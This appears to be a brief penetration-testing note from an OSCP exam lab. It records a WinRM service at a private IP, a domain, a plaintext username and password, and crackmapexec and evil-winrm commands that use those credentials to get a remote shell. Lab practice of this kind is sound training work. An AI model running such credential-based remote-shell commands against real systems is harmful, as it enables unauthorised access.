# Info  

```
WinRM was possibly detected running on tcp port 5985.

192.168.114.206
domain: oscp.exam 
Username: r.andrews
Password: BusyOfficeWorker890


crackmapexec winrm 192.168.114.206 -d 'oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890'

evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206
```who